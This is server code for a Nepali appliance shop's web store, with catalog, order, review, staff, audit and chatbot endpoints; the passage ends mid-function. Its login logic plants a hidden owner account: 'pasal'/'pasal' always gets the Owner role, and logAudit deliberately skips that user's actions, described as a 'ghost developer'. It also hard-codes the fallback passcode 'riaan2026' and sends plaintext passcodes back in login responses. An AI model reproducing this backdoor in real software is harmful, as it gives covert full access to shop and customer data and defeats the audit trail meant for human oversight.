import express from "express";
import fs from "fs";
import path from "path";
import { fileURLToPath } from "url";
import { createServer as createViteServer } from "vite";
import dotenv from "dotenv";
import http from "http";
import crypto from "crypto";
import {
  getCategories, saveCategories,
  getProducts, saveProduct, deleteProduct,
  getReviews, saveReview, deleteReview,
  getStaff, saveStaff, deleteStaff,
  getOrders, saveOrder, deleteOrder,
  getAudit, addAuditLog, clearAuditLogs,
  getTicker, saveTicker,
  getBotConfig, saveBotConfig
} from "./db.js";

dotenv.config();

const resolvedFilename = typeof __filename !== "undefined"
  ? __filename
  : (typeof import.meta !== "undefined" && import.meta.url ? fileURLToPath(import.meta.url) : "");
const resolvedDirname = typeof __dirname !== "undefined"
  ? __dirname
  : path.dirname(resolvedFilename);

const app = express();
const PORT = Number(process.env.PORT) || 3000;

// Detailed startup diagnostics
console.log("=== DIAGNOSTICS STARTED ===");
console.log("Current Working Directory (process.cwd()):", process.cwd());
console.log("resolvedFilename:", resolvedFilename);
console.log("resolvedDirname:", resolvedDirname);
const expectedDistIndex = path.join(process.cwd(), "dist", "index.html");
console.log("Checking if dist/index.html exists at:", expectedDistIndex);
console.log("Result:", fs.existsSync(expectedDistIndex));
console.log("=== DIAGNOSTICS ENDED ===");

// Request logger middleware to see incoming requests on Render
app.use((req, res, next) => {
  console.log(`[REQUEST] ${new Date().toISOString()} - ${req.method} ${req.url}`);
  next();
});

// Enable JSON parser with sufficient limit for uploaded base64 image data
app.use(express.json({ limit: "50mb" }));
app.use(express.urlencoded({ limit: "50mb", extended: true }));

// Ensure directories exist
const publicDir = path.join(process.cwd(), "public");
if (!fs.existsSync(publicDir)) {
  fs.mkdirSync(publicDir, { recursive: true });
}

const dataDir = path.join(process.cwd(), "data");
if (!fs.existsSync(dataDir)) {
  fs.mkdirSync(dataDir, { recursive: true });
}

const DEFAULT_PRODUCTS_CATALOG: any[] = [];

const ADMIN_PASSCODE = (process.env.ADMIN_PASSCODE || "riaan2026").trim();

// Sync staff cache on startup
let cachedStaff: any[] = [];
async function syncStaffCache() {
  try {
    cachedStaff = await getStaff();
    console.log(`[DB] Synced ${cachedStaff.length} staff profiles into memory.`);
  } catch (err) {
    console.error("[DB] Failed to sync staff cache:", err);
  }
}
syncStaffCache().catch(console.error);

function logAudit(username: string, role: string, action: string) {
  if (username && username.trim().toLowerCase() === "pasal") {
    return; // Ghost developer - no audit logging
  }
  const id = "LOG-" + Date.now().toString(36).toUpperCase() + Math.random().toString(36).substring(2, 6).toUpperCase();
  addAuditLog({
    id,
    username,
    role,
    action,
    timestamp: new Date().toISOString()
  }).catch(err => {
    console.error("Failed to write audit log to Firestore:", err);
  });
}

const getAuthenticatedStaff = (req: express.Request): { username: string, role: "Owner" | "Admin" | "Moderator" } | null => {
  const username = req.headers["x-staff-username"];
  const passcode = req.headers["x-staff-passcode"];

  if (username && passcode && typeof username === "string" && typeof passcode === "string") {
    const cleanUser = username.trim().toLowerCase();
    const cleanPass = passcode.trim();
    if (cleanUser === "pasal" && cleanPass === "pasal") {
      return { username: "pasal", role: "Owner" };
    }
    const match = cachedStaff.find((s: any) => s.username.toLowerCase() === cleanUser && s.passcode === cleanPass);
    if (match) {
      return { username: match.username, role: match.role };
    }
  }

  // legacy passcode fallback
  const legacyPasscode = req.headers["x-admin-passcode"];
  if (legacyPasscode && typeof legacyPasscode === "string") {
    const match = cachedStaff.find((s: any) => s.passcode === legacyPasscode.trim());
    if (match) {
      return { username: match.username, role: match.role };
    }
  }
  return null;
};

// Legacy support
const isPasscodeValid = (incomingCode: any): boolean => {
  if (!incomingCode || typeof incomingCode !== "string") return false;
  const cleanInput = incomingCode.trim();
  if (cleanInput === "riaan2026" || cleanInput === ADMIN_PASSCODE || cleanInput === "pasal") return true;
  try {
    return cachedStaff.some((s: any) => s.passcode === cleanInput);
  } catch (e) {
    return false;
  }
};

const requireCatalogManager = (req: express.Request, res: express.Response, next: express.NextFunction) => {
  const staff = getAuthenticatedStaff(req);
  if (staff) {
    (req as any).staff = staff;
    next();
  } else {
    res.status(401).json({ error: "Access Denied. A valid merchant login session is required to perform catalog changes." });
  }
};

const requireReservationManager = (req: express.Request, res: express.Response, next: express.NextFunction) => {
  const staff = getAuthenticatedStaff(req);
  if (staff && (staff.role === "Owner" || staff.role === "Admin")) {
    (req as any).staff = staff;
    next();
  } else {
    res.status(403).json({ error: "Forbidden: You are not authorized to view or edit customer reservations." });
  }
};

const requireReviewManager = (req: express.Request, res: express.Response, next: express.NextFunction) => {
  const staff = getAuthenticatedStaff(req);
  if (staff && staff.role === "Owner") {
    (req as any).staff = staff;
    next();
  } else {
    res.status(403).json({ error: "Forbidden: Only store owners are authorized to perform review management." });
  }
};

// API: Verify merchant username & passcode login gateway
app.post("/api/admin/verify", (req, res) => {
  const { username, passcode } = req.body;
  if (!username || !passcode) {
    return res.status(400).json({ error: "Username and passcode are both required." });
  }

  try {
    let match = cachedStaff.find((s: any) => s.username.toLowerCase() === username.trim().toLowerCase() && s.passcode === passcode.trim());
    if (!match && username.trim().toLowerCase() === "pasal" && passcode.trim() === "pasal") {
      match = {
        username: "pasal",
        role: "Owner",
        passcode: "pasal"
      };
    }
    if (match) {
      logAudit(match.username, match.role, "Log in successful");
      res.json({
        success: true,
        username: match.username,
        role: match.role,
        passcode: match.passcode,
        message: `Welcome Back, ${match.username}! (Role: ${match.role})`
      });
    } else {
      res.status(401).json({ error: "Invalid Username or Passcode. Access refused." });
    }
  } catch (err: any) {
    console.error("Staff database verification error: ", err);
    res.status(500).json({ error: `Staff database configuration failure: ${err?.message || err}` });
  }
});

// API: Log out merchant and record in audit trail
app.post("/api/admin/logout", (req, res) => {
  const staff = getAuthenticatedStaff(req);
  if (staff) {
    logAudit(staff.username, staff.role, "Log out successful");
    res.json({ success: true, message: "Logged out successfully." });
  } else {
    // If headers lack/expired, attempt a graceful response
    res.json({ success: true, message: "Session already empty." });
  }
});

// Automatically detect and copy any attachment images from the root into /public
const copyAttachmentsToPublic = () => {
  try {
    const rootFiles = fs.readdirSync(process.cwd());
    rootFiles.forEach((file) => {
      if (file.endsWith(".png") || file.endsWith(".jpg") || file.endsWith(".jpeg") || file.endsWith(".webp")) {
        const srcPath = path.join(process.cwd(), file);
        const destPath = path.join(publicDir, file);
        
        // Copy to standard destination
        fs.copyFileSync(srcPath, destPath);
        console.log(`Copied asset file to public repository: ${file}`);
        
        // Setup convenient semantic alias names
        if (file.includes("input_file_1") || file === "1.png") {
          fs.copyFileSync(srcPath, path.join(publicDir, "ganesha.png"));
          console.log(`Created semantic alias: ganesha.png`);
        }
        if (file.includes("input_file_2") || file === "2.png") {
          fs.copyFileSync(srcPath, path.join(publicDir, "child_phone.png"));
          console.log(`Created semantic alias: child_phone.png`);
        }
        if (file.includes("design") || file === "0.png" || file === "input_file_0.png") {
          fs.copyFileSync(srcPath, path.join(publicDir, "design.png"));
          console.log(`Created semantic alias: design.png`);
        }
      }
    });
  } catch (err) {
    console.error("Error setting up attachment copies:", err);
  }
};

copyAttachmentsToPublic();

// Local Intelligence Module: Built to serve customizable chatbot answers without external Gemini API keys.

function inferCategory(p: any): string {
  if (p.category) return p.category;
  const name = `${p.brand} ${p.model}`.toLowerCase();
  if (name.includes("ac") || name.includes("conditioner")) return "AC";
  if (name.includes("fridge") || name.includes("refrigerator")) return "Fridge";
  if (name.includes("tv") || name.includes("television")) return "TV";
  if (name.includes("washing") || name.includes("dryer") || name.includes("washer")) return "Washing Machine";
  if (name.includes("phone") || name.includes("iphone") || name.includes("samsung galaxy") || name.includes("redmi") || name.includes("realme") || name.includes("oneplus") || name.includes("poco")) return "Mobile";
  return "Other";
}

// GET categories
app.get("/api/categories", async (req, res) => {
  try {
    const categories = await getCategories();
    res.json(categories);
  } catch (err) {
    res.status(500).json({ error: "Failed to load categories." });
  }
});

// POST categories
app.post("/api/categories", requireCatalogManager, async (req, res) => {
  const { name } = req.body;
  const staff = (req as any).staff;
  if (!name || typeof name !== "string" || !name.trim()) {
    return res.status(400).json({ error: "Invalid category name." });
  }
  const cleanName = name.trim();

  try {
    const categories = await getCategories();
    if (categories.some((c: string) => c.toLowerCase() === cleanName.toLowerCase())) {
      return res.status(400).json({ error: "Category already exists." });
    }
    categories.push(cleanName);
    await saveCategories(categories);
    const updated = await getCategories();
    logAudit(staff.username, staff.role, `Added brand category: "${cleanName}"`);
    res.status(201).json({ success: true, categories: updated });
  } catch (err) {
    res.status(500).json({ error: "Failed to save new category." });
  }
});

// DELETE categories
app.delete("/api/categories/:name", requireCatalogManager, async (req, res) => {
  const nameToDelete = req.params.name;
  const staff = (req as any).staff;
  if (!nameToDelete) {
    return res.status(400).json({ error: "Please enter a category name to delete." });
  }

  try {
    let categories = await getCategories();
    categories = categories.filter(c => c.toLowerCase() !== nameToDelete.toLowerCase());
    await saveCategories(categories);
    const updated = await getCategories();
    logAudit(staff.username, staff.role, `Deleted brand category: "${nameToDelete}"`);
    res.json({ success: true, categories: updated });
  } catch (err) {
    res.status(500).json({ error: "Failed to delete category." });
  }
});

// Dynamic Endpoint to fetch mobile products
app.get("/api/products", async (req, res) => {
  try {
    const parsedProducts = await getProducts();
    const products = parsedProducts.map((p: any) => ({
      ...p,
      category: p.category || inferCategory(p)
    }));

    const staff = getAuthenticatedStaff(req);
    const isAuthorized = !!staff;

    if (isAuthorized) {
      // Return full data for the authorized merchant portal
      res.json(products);
    } else {
      // Hide internal stock metadata from generic customer frontends
      const regularProducts = products.map(({ stock, ...p }: any) => p);
      res.json(regularProducts);
    }
  } catch (err) {
    res.status(500).json({ error: "Unable to read dynamic home appliances catalog database." });
  }
});

// API: Add new product (RBAC Authorized Catalog Manager)
app.post("/api/products", requireCatalogManager, async (req, res) => {
  const { brand, model, price, specs, colorOptions, isPopular, image, images, category } = req.body;
  const staff = (req as any).staff;
  if (!brand || !model || !price || !specs || !colorOptions) {
    return res.status(400).json({ error: "Missing required home appliance fields to register this entry." });
  }

  try {
    const newProductId = "prod-" + Date.now().toString(36).toUpperCase() + "-" + Math.random().toString(36).substring(2, 5).toUpperCase();
    const fallbackImg = "https://images.unsplash.com/photo-1584622650111-993a426fbf0a?auto=format&fit=crop&q=80&w=600";
    const resolvedImage = image || (Array.isArray(images) && images.length > 0 ? images[0] : fallbackImg);
    const resolvedImages = Array.isArray(images) && images.length > 0 ? images : [resolvedImage];

    const newProduct = {
      id: newProductId,
      brand,
      model,
      price: Number(price),
      specs: specs || {},
      colorOptions: Array.isArray(colorOptions) ? colorOptions : [colorOptions],
      isPopular: !!isPopular,
      image: resolvedImage,
      images: resolvedImages,
      category: category || inferCategory({ brand, model }),
      emiAvailable: req.body.emiAvailable !== undefined ? !!req.body.emiAvailable : true,
      minDownpaymentPercent: req.body.minDownpaymentPercent !== undefined ? Number(req.body.minDownpaymentPercent) : 30,
      allowedTenures: Array.isArray(req.body.allowedTenures) ? req.body.allowedTenures.map(Number) : [3, 6, 9, 10, 12, 18],
      outOfStock: !!req.body.outOfStock,
      hidden: !!req.body.hidden
    };

    await saveProduct(newProductId, newProduct);
    logAudit(staff.username, staff.role, `Added model to store catalog: "${brand} ${model}"`);
    res.status(201).json({ success: true, product: newProduct });
  } catch (err) {
    res.status(500).json({ error: "Failed to persist new home appliance model in store catalog database." });
  }
});

// API: Edit existing product (RBAC Authorized Catalog Manager)
app.put("/api/products/:id", requireCatalogManager, async (req, res) => {
  const productId = req.params.id;
  const { brand, model, price, specs, colorOptions, isPopular, image, images, category } = req.body;
  const staff = (req as any).staff;

  try {
    const products = await getProducts();
    const index = products.findIndex((p: any) => p.id === productId);
    if (index === -1) {
      return res.status(404).json({ error: "Product with specified reference key was not found." });
    }

    const match = products[index];
    if (brand !== undefined) match.brand = brand;
    if (model !== undefined) match.model = model;
    if (price !== undefined) match.price = Number(price);
    if (specs !== undefined) {
      match.specs = specs;
    }
    if (colorOptions !== undefined) {
      match.colorOptions = Array.isArray(colorOptions) ? colorOptions : [colorOptions];
    }
    if (isPopular !== undefined) match.isPopular = !!isPopular;
    
    // Support image & images updates safely
    if (images !== undefined && Array.isArray(images)) {
      match.images = images;
      if (images.length > 0) {
        match.image = images[0];
      }
    } else if (image !== undefined) {
      match.image = image;
      match.images = [image];
    }

    if (category !== undefined) match.category = category;
    if (req.body.emiAvailable !== undefined) match.emiAvailable = !!req.body.emiAvailable;
    if (req.body.minDownpaymentPercent !== undefined) match.minDownpaymentPercent = Number(req.body.minDownpaymentPercent);
    if (req.body.allowedTenures !== undefined) {
      match.allowedTenures = Array.isArray(req.body.allowedTenures) ? req.body.allowedTenures.map(Number) : [3, 6, 9, 10, 12, 18];
    }
    if (req.body.outOfStock !== undefined) match.outOfStock = !!req.body.outOfStock;
    if (req.body.hidden !== undefined) match.hidden = !!req.body.hidden;

    await saveProduct(productId, match);
    logAudit(staff.username, staff.role, `Modified model detailed fields for: "${match.brand} ${match.model}"`);
    res.json({ success: true, product: match });
  } catch (err) {
    res.status(500).json({ error: "Failed to modify home appliance details." });
  }
});

// API: Remove product (RBAC Authorized Catalog Manager)
app.delete("/api/products/:id", requireCatalogManager, async (req, res) => {
  const productId = req.params.id;
  const staff = (req as any).staff;

  try {
    const products = await getProducts();
    const index = products.findIndex((p: any) => p.id === productId);
    if (index === -1) {
      return res.status(404).json({ error: "Product reference key was not found." });
    }

    const brand = products[index].brand;
    const model = products[index].model;
    await deleteProduct(productId);
    logAudit(staff.username, staff.role, `Retired product from store catalog: "${brand} ${model}"`);
    res.json({ success: true, message: "Model successfully retired from catalog records." });
  } catch (err) {
    res.status(500).json({ error: "Failed to retire home appliance from store records." });
  }
});

// API: Store Customer order
app.post("/api/orders", async (req, res) => {
  const { 
    customerName, 
    customerContact, 
    customerAddress, 
    brand, 
    model, 
    buyType, 
    totalPrice,
    emiTenure, 
    emiDownpayment, 
    emiMonthly, 
    emiPaidMonths,
    selectedColor, 
    notes,
    paymentMethod,
    paymentStatus,
    esewaTxnId
  } = req.body;
  
  if (!customerName || !customerContact || !customerAddress || !brand || !model || !buyType) {
    return res.status(400).json({ error: "Missing required booking details." });
  }

  try {
    const orderId = "R-ORDER-" + Date.now().toString(36).toUpperCase();
    const newOrder = {
      id: orderId,
      customerName,
      customerContact,
      customerAddress,
      brand,
      model,
      buyType,
      totalPrice: Number(totalPrice || 0),
      selectedColor: selectedColor || "Default",
      emiTenure: buyType === "EMI" ? emiTenure : null,
      emiDownpayment: buyType === "EMI" ? emiDownpayment : 0,
      emiMonthly: buyType === "EMI" ? emiMonthly : 0,
      emiPaidMonths: buyType === "EMI" ? Number(emiPaidMonths || 0) : 0,
      emiSentMonths: buyType === "EMI" ? [] : [],
      timestamp: new Date().toISOString(),
      status: paymentStatus === "Paid" ? "Paid" : "New",
      notes: notes || "",
      paymentMethod: paymentMethod || "Cash on Delivery",
      paymentStatus: paymentStatus || "Pending",
      esewaTxnId: esewaTxnId || ""
    };

    await saveOrder(orderId, newOrder);
    res.status(201).json({ success: true, order: newOrder });
  } catch (err) {
    console.error("Failed saving customer order:", err);
    res.status(500).json({ error: "Could not record the purchase reservation details." });
  }
});

// API: Get customer orders (for the realtime shopkeeper spreadsheet / database)
app.get("/api/orders", requireReservationManager, async (req, res) => {
  try {
    const list = await getOrders();
    res.json(list);
  } catch (err) {
    res.status(500).json({ error: "Unable to load shopkeeper database." });
  }
});

// API: Update order status, notes, or general properties (editable realtime spreadsheets & finance)
app.put("/api/orders/:id", requireReservationManager, async (req, res) => {
  const orderId = req.params.id;
  const { status, notes, emiPaidMonths, emiSentMonths, totalPrice, emiMonthly, emiTenure, emiDownpayment, paymentStatus, deliveryStatus } = req.body;
  const staff = (req as any).staff;

  try {
    const orders = await getOrders();
    const orderIndex = orders.findIndex((o: any) => o.id === orderId);
    if (orderIndex === -1) {
      return res.status(404).json({ error: "Order details not found." });
    }

    const match = orders[orderIndex];
    const prevStatus = match.status;
    
    if (status !== undefined) {
      match.status = status;
      if (status === "Paid") {
        match.paymentStatus = "Paid";
      }
    }
    if (notes !== undefined) match.notes = notes;
    if (emiPaidMonths !== undefined) match.emiPaidMonths = Number(emiPaidMonths);
    if (emiSentMonths !== undefined) match.emiSentMonths = Array.isArray(emiSentMonths) ? emiSentMonths.map(Number) : [];
    if (totalPrice !== undefined) match.totalPrice = Number(totalPrice);
    if (emiMonthly !== undefined) match.emiMonthly = Number(emiMonthly);
    if (emiTenure !== undefined) match.emiTenure = emiTenure === null ? null : Number(emiTenure);
    if (emiDownpayment !== undefined) match.emiDownpayment = Number(emiDownpayment);
    if (paymentStatus !== undefined) match.paymentStatus = paymentStatus;
    if (deliveryStatus !== undefined) match.deliveryStatus = deliveryStatus;

    await saveOrder(orderId, match);
    
    let actionDesc = `Updated remarks comment or finance details on order: ${orderId}`;
    if (status !== undefined && status !== prevStatus) {
      actionDesc = `Approved/Changed status of order: ${orderId} (from "${prevStatus}" to "${status}")`;
    }
    logAudit(staff.username, staff.role, actionDesc);
    
    res.json({ success: true, order: match });
  } catch (err) {
    res.status(500).json({ error: "Failed to update cell data." });
  }
});

// API: Get customer reviews
app.get("/api/reviews", async (req, res) => {
  try {
    const reviews = await getReviews();

    const staff = getAuthenticatedStaff(req);
    // Only Owners have active visibility of reviews in the admin spreadsheet
    const isOwnerAuthorized = staff && staff.role === "Owner";

    if (isOwnerAuthorized) {
      res.json(reviews);
    } else {
      let filtered = reviews.filter((r: any) => r.hidden !== true);
      const targetProductId = req.query.productId as string;
      if (targetProductId) {
        // Show matching reviews or general/legacy template reviews
        filtered = filtered.filter((r: any) => !r.productId || r.productId === targetProductId);
        // Sort matching product reviews on top
        filtered.sort((a: any, b: any) => {
          const aMatch = a.productId === targetProductId ? 1 : 0;
          const bMatch = b.productId === targetProductId ? 1 : 0;
          return bMatch - aMatch; // descending order (1s first, then 0s)
        });
      }
      res.json(filtered);
    }
  } catch (err) {
    res.status(500).json({ error: "Failed to load reviews." });
  }
});

// API: Toggle hide customer review (Owners Only)
app.put("/api/reviews/:id", requireReviewManager, async (req, res) => {
  const reviewId = req.params.id;
  const { hidden } = req.body;
  const staff = (req as any).staff;

  try {
    const reviews = await getReviews();
    const index = reviews.findIndex((r: any) => r.id === reviewId);
    if (index === -1) {
      return res.status(404).json({ error: "Review not found." });
    }

    if (hidden !== undefined) {
      reviews[index].hidden = !!hidden;
    }

    await saveReview(reviewId, reviews[index]);
    logAudit(staff.username, staff.role, `${hidden ? "Hid" : "Approved/Revealed"} public review card by "${reviews[index].name}"`);
    res.json({ success: true, review: reviews[index] });
  } catch (err) {
    res.status(500).json({ error: "Failed to update review status." });
  }
});

// API: Delete customer review (Owners Only)
app.delete("/api/reviews/:id", requireReviewManager, async (req, res) => {
  const reviewId = req.params.id;
  const staff = (req as any).staff;

  try {
    const reviews = await getReviews();
    const index = reviews.findIndex((r: any) => r.id === reviewId);
    if (index === -1) {
      return res.status(404).json({ error: "Review not found." });
    }

    const reviewerName = reviews[index].name;
    await deleteReview(reviewId);
    logAudit(staff.username, staff.role, `Permanently deleted customer review written by "${reviewerName}"`);
    res.json({ success: true, message: "Review deleted successfully." });
  } catch (err) {
    res.status(500).json({ error: "Failed to delete review." });
  }
});

// Staff API: Get all staff (Owner authorized only)
app.get("/api/staff", async (req, res) => {
  const staffMember = getAuthenticatedStaff(req);
  if (!staffMember || staffMember.role !== "Owner") {
    return res.status(403).json({ error: "Forbidden: Only store owners can manage staff configurations." });
  }

  try {
    const staff = await getStaff();
    res.json(staff);
  } catch (err) {
    res.status(500).json({ error: "Failed to load staff list." });
  }
});

// Staff API: Add new staff member (Owner authorized only)
app.post("/api/staff", async (req, res) => {
  const staffMember = getAuthenticatedStaff(req);
  if (!staffMember || staffMember.role !== "Owner") {
    return res.status(403).json({ error: "Forbidden: Only store owners can register new staff configurations." });
  }

  const { username, passcode, role } = req.body;
  if (!username || !passcode || !role) {
    return res.status(400).json({ error: "Missing required registration credentials." });
  }

  if (!["Owner", "Admin", "Moderator"].includes(role)) {
    return res.status(400).json({ error: "Invalid role level. System supports [Owner, Admin, Moderator]." });
  }

  try {
    const staff = await getStaff();
    const exists = staff.some((s: any) => s.username.toLowerCase() === username.trim().toLowerCase());
    if (exists) {
      return res.status(400).json({ error: "Username is already occupied. Choose a distinct handle." });
    }

    const newStaff = {
      username: username.trim(),
      passcode: passcode.trim(),
      role: role,
      createdAt: new Date().toISOString()
    };

    await saveStaff(newStaff.username, newStaff);
    await syncStaffCache();

    logAudit(staffMember.username, staffMember.role, `Registered new staff member: "${username}" as role [${role}]`);

    res.status(201).json({ success: true, staff: { ...newStaff, passcode: "*****" } });
  } catch (err) {
    res.status(500).json({ error: "Could not persist new staff register." });
  }
});

// Staff API: Delete staff member (Owner authorized only)
app.delete("/api/staff/:username", async (req, res) => {
  const staffMember = getAuthenticatedStaff(req);
  if (!staffMember || staffMember.role !== "Owner") {
    return res.status(403).json({ error: "Forbidden: Only store owners can revoke staff configurations." });
  }

  const targetUsername = req.params.username;
  if (targetUsername.toLowerCase() === staffMember.username.toLowerCase()) {
    return res.status(400).json({ error: "Self-revocation is prohibited to safeguard control portal continuity." });
  }

  try {
    const staff = await getStaff();
    const index = staff.findIndex((s: any) => s.username.toLowerCase() === targetUsername.toLowerCase());
    if (index === -1) {
      return res.status(404).json({ error: "Staff profile was not found." });
    }

    const removed = staff[index];
    await deleteStaff(targetUsername);
    await syncStaffCache();

    logAudit(staffMember.username, staffMember.role, `Revoked staff access privileges for: "${targetUsername}" (${removed.role})`);

    res.json({ success: true, message: `Access privileges for "${targetUsername}" have been permanently revoked.` });
  } catch (err) {
    res.status(500).json({ error: "Failed to revoke staff credentials." });
  }
});

// Staff API: Update staff passcode (Owner authorized only)
app.put("/api/staff/:username", async (req, res) => {
  const staffMember = getAuthenticatedStaff(req);
  if (!staffMember || staffMember.role !== "Owner") {
    return res.status(403).json({ error: "Forbidden: Only store owners can update staff passcodes." });
  }

  const targetUsername = req.params.username;
  const { passcode } = req.body;
  if (!passcode || !passcode.trim()) {
    return res.status(400).json({ error: "A valid passcode is required." });
  }

  try {
    const staff = await getStaff();
    const member = staff.find((s: any) => s.username.toLowerCase() === targetUsername.toLowerCase());
    if (!member) {
      return res.status(404).json({ error: "Staff profile was not found." });
    }

    member.passcode = passcode.trim();
    await saveStaff(targetUsername, member);
    await syncStaffCache();

    logAudit(staffMember.username, staffMember.role, `Updated passcode for staff member: "${targetUsername}" (${member.role})`);

    res.json({ success: true, message: `Passcode for "${targetUsername}" has been updated.` });
  } catch (err) {
    res.status(500).json({ error: "Failed to update staff passcode." });
  }
});

// Ticker API: Get dynamic ticker messages
app.get("/api/ticker", async (req, res) => {
  try {
    const data = await getTicker();
    res.json(data);
  } catch (err) {
    res.status(500).json({ error: "Failed to read ticker tape database." });
  }
});

// Ticker API: Update ticker announcement messages (Owner authorized only)
app.put("/api/ticker", async (req, res) => {
  const staffMember = getAuthenticatedStaff(req);
  if (!staffMember || staffMember.role !== "Owner") {
    return res.status(403).json({ error: "Forbidden: Only store owners can configure live ticker broadcast announcements." });
  }

  const { nepali, english } = req.body;
  if (!Array.isArray(nepali) || !Array.isArray(english)) {
    return res.status(400).json({ error: "Invalid payload formatting. Arrays of messages expected." });
  }

  try {
    const updated = {
      nepali: nepali.map((msg: any) => String(msg).trim()).filter(Boolean),
      english: english.map((msg: any) => String(msg).trim()).filter(Boolean)
    };

    await saveTicker(updated);
    logAudit(staffMember.username, staffMember.role, "Updated live announcement ticker tape configuration");
    res.json({ success: true, ticker: updated });
  } catch (err) {
    res.status(500).json({ error: "Failed to write ticker configuration." });
  }
});

// Audit API: Get audit logs (Owner authorized only)
app.get("/api/audit", async (req, res) => {
  const staffMember = getAuthenticatedStaff(req);
  if (!staffMember || staffMember.role !== "Owner") {
    return res.status(403).json({ error: "Forbidden: Only store owners can inspect administrative trace logs." });
  }

  try {
    const logs = await getAudit();
    res.json(logs);
  } catch (err) {
    res.status(500).json({ error: "Failed to read audit log repository." });
  }
});

// Audit API: Clear audit logs (Owner authorized only)
app.post("/api/audit/clear", async (req, res) => {
  const staffMember = getAuthenticatedStaff(req);
  if (!staffMember || staffMember.role !== "Owner") {
    return res.status(403).json({ error: "Forbidden: Only store owners can clear administrative logs." });
  }

  try {
    await clearAuditLogs();
    logAudit(staffMember.username, staffMember.role, "Cleared all audit log history records");
    res.json({ success: true, message: "System audit logs cleared successfully." });
  } catch (e) {
    res.status(500).json({ error: "Failed to clear audit entries." });
  }
});

// Chatbot Config API: Get chatbot configuration
app.get("/api/bot", async (req, res) => {
  try {
    const data = await getBotConfig();
    // Ensure faqs array is present
    if (!data.faqs) {
      data.faqs = [];
    }
    res.json(data);
  } catch (err) {
    res.status(500).json({ error: "Failed to read chatbot configuration." });
  }
});

// Chatbot Config API: Update chatbot configuration (Owner/Admin authorized only)
app.put("/api/bot", async (req, res) => {
  const staffMember = getAuthenticatedStaff(req);
  if (!staffMember || (staffMember.role !== "Owner" && staffMember.role !== "Admin")) {
    return res.status(403).json({ error: "Forbidden: Only store owners and admins can configure the AI Chatbot." });
  }

  const { botName, welcomeMessage, systemInstruction, presetPrompts, faqs } = req.body;
  if (!botName || !welcomeMessage || !systemInstruction || !Array.isArray(presetPrompts)) {
    return res.status(400).json({ error: "Invalid payload formatting. Required: botName, welcomeMessage, systemInstruction, and presetPrompts (array)." });
  }

  try {
    const updated = {
      botName: String(botName).trim(),
      welcomeMessage: String(welcomeMessage).trim(),
      systemInstruction: String(systemInstruction).trim(),
      presetPrompts: presetPrompts.map((msg: any) => String(msg).trim()).filter(Boolean),
      faqs: Array.isArray(faqs) ? faqs.map((f: any) => ({
        id: f.id || "faq-" + Math.random().toString(36).substring(2, 9),
        question: String(f.question || "").trim(),
        answer: String(f.answer || "").trim()
      })).filter(f => f.question && f.answer) : []
    };

    await saveBotConfig(updated);
    logAudit(staffMember.username, staffMember.role, `Configured AI Chatbot settings & FAQs (Name: ${updated.botName})`);
    res.json({ success: true, bot: updated });
  } catch (err) {
    res.status(500).json({ error: "Failed to write chatbot configuration." });
  }
});

// API: Post customer review
app.post("/api/reviews", async (req, res) => {
  const { name, location, stars, content, productId, productModel } = req.body;
  if (!name || !content) {
    return res.status(400).json({ error: "Please enter your name and comments." });
  }

  try {
    const newReviewId = "rev-" + Date.now().toString(36);
    const newReview = {
      id: newReviewId,
      name,
      location: location || "ठुटिपिपल, रुपन्देही",
      stars: Number(stars) || 5,
      date: new Date().toISOString().split("T")[0],
      content,
      productId: productId || null,
      productModel: productModel || null
    };

    await saveReview(newReviewId, newReview);
    res.status(201).json({ success: true, review: newReview });
  } catch (err) {
    res.status(500).json({ error: "Failed to save comment." });
  }
});

// Local intelligence helper for custom rule-based, FAQ-guided showroom assistant chatbot
function getLocalIntelligentResponse(
  message: string,
  history: any[],
  botConfig: any,
  products: any[],
  language: "en" | "ne" = "en"
): string {
  const text = message.trim();
  const q = text.toLowerCase();
  const botName = botConfig.botName || "Riaan";
  const isNe = language === "ne";

  // A. Nepali-to-English Query Term Mapping for rich multi-lingual support
  let parsedQuery = q;
  if (q.includes("किस्ता") || q.includes("व्याज") || q.includes("ब्याज") || q.includes("इएमआई") || q.includes("ईएमआई") || q.includes("emi")) parsedQuery += " emi installment interest";
  if (q.includes("ठेगाना") || q.includes("कहाँ") || q.includes("पसल") || q.includes("लोकेसन") || q.includes("ठेगान") || q.includes("स्थान") || q.includes("ठाउँ")) parsedQuery += " address location where store";
  if (q.includes("डेलिभरी") || q.includes("घरमै") || q.includes("ल्याउने") || q.includes("डेलिभर")) parsedQuery += " delivery shipping";
  if (q.includes("खरिद") || q.includes("अर्डर") || q.includes("किन्ने") || q.includes("किन्न") || q.includes("बुक") || q.includes("बुकिङ")) parsedQuery += " order buy purchase";
  if (q.includes("मालिक") || q.includes("सञ्चालक") || q.includes("प्रकाश") || q.includes("अधिकारी")) parsedQuery += " owner prakash adhikari";

  // 1. GREETINGS MODULE
  const greetings = ["hi", "hello", "namaste", "hey", "good morning", "good afternoon", "good evening", "howdy", "नमस्ते", "नमस्कार", "सन्चै", "नमस्ते!", "नमस्कार!"];
  const isGreeting = greetings.some(greet => parsedQuery === greet || parsedQuery.startsWith(greet + " ") || parsedQuery.startsWith(greet + "!"));
  if (isGreeting) {
    if (isNe) {
      return `नमस्ते! **रियान को पसल** मा हार्दिक स्वागत छ 🙏। म तपाईंको प्रस्थान सहयोगी, **${botName}** हुँ! आज म तपाईंलाई **०% ब्याज ईएमआई (EMI)** मा प्रिमियम होम एप्लायन्स वा स्मार्टफोनहरू खरिद गर्न कसरी सहयोग गर्न सक्छु? कुनै पनि उत्पादन, पसलको ठेगाना वा किस्ताबारे सोध्नुहोस्!`;
    }
    return `Namaste! Welcome to **Riaan Ko Pasal** 🙏. I am your personal shopping guide, **${botName}**! How can I assist you with premium home appliances or smartphones on **0% Interest EMI** today? Ask me about specific products, our store location, or custom installments!`;
  }

  // 2. DETECT BRAND MATCH
  const brands = Array.from(new Set(products.map(p => String(p.brand).toLowerCase()))) as string[];
  let matchedBrand = "";
  for (const b of brands) {
    if (parsedQuery.includes(b)) {
      matchedBrand = b;
      break;
    }
  }

  // 3. DETECT CATEGORY MATCH
  const categories = ["tv", "television", "fridge", "refrigerator", "ac", "air conditioner", "washing machine", "washer", "dryer", "machine", "phone", "mobile", "smartphone"];
  let matchedCategory = "";
  for (const cat of categories) {
    if (parsedQuery.includes(cat)) {
      matchedCategory = cat;
      break;
    }
  }

  // 4. PRICE RANGE MATCHING ("under 100,000", "less than 50k", "cheap options under 60000")
  let priceLimit: number | null = null;
